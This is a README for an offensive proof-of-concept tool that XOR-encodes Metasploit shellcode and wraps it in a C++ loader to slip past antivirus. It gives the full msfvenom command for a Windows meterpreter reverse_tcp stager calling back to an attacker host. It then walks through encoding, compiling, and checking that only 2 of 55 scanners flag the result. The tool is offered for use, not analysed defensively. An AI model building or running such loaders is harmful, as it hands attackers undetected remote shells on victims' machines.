MutlibyteEncodedShellcode
============

Author: Arno0x0x - [@Arno0x0x](http://twitter.com/Arno0x0x)

This little proof of concept is inspired by this blogpost: [Bypass antivirus with 10 lines of code](http://www.attactics.org/2016/03/bypassing-antivirus-with-10-lines-of.html)

There are two code files provided:
- shellcode_xor_encoder.py : This is a python file that will XOR encrypt a provided shellcode with a multibyte key.
- mutlibyteEncodedShellcode.cpp : This is the core C++ file that needs to be compiled. This file contains the encoded shellcode obtained from the output of the python script, it decrypts it given the same key, and loads the shellcode into memory before calling it.

How to use ?
----------------------
First, you need to obtain a usable shellcode from metasploit (I run it from a Kali distribution):
```
root@kali:~# msfvenom -a x86 -p windows/meterpreter/reverse_tcp LHOST=192.168.52.130 LPORT=4444 -f py
```
The output is an unencoded reverse_tcp meterpreter stager for x86 platform. You should adapt it to your needs (payload and parameters).

Then, edit the shellcode_xor_encoder.py file and paste the output buffer from previous command, and also set your desired encryption key.
Run the pyhton script:
```
root@kali:~# python shellcode_xor_encoder.py
```

Eventually, compile the C++ file into a Windows executable. You can create a new VisualStudio project for **Win32 console application** and use the C++ code provided as the main file. Any other method of compilation will require slight adjustment of the C++ code (headers mostly).

Detection rate
----------------------
As you can see, the code makes use of no other trick to evade AV detection or sandboxing. Still, today, 1st of June 2016, the detection ratio on VirusTotal is still very good (2/55)

![vt](https://dl.dropboxusercontent.com/s/x1c08b8k3cmvknu/mutlibyteEncodedShellcode_VT_result.jpg?dl=0)

Does it work ?
----------------------

YES :-)
![meterpreter](https://dl.dropboxusercontent.com/s/zo7niur27sesjuv/profit.jpg?dl=0)



![bitcoin](https://dl.dropboxusercontent.com/s/imckco5cg0llfla/bitcoin-icon.png?dl=0) Like these tools ? Tip me with bitcoins !
![address](https://dl.dropboxusercontent.com/s/9bd5p45xmqz72vw/bc_tipping_address.png?dl=0)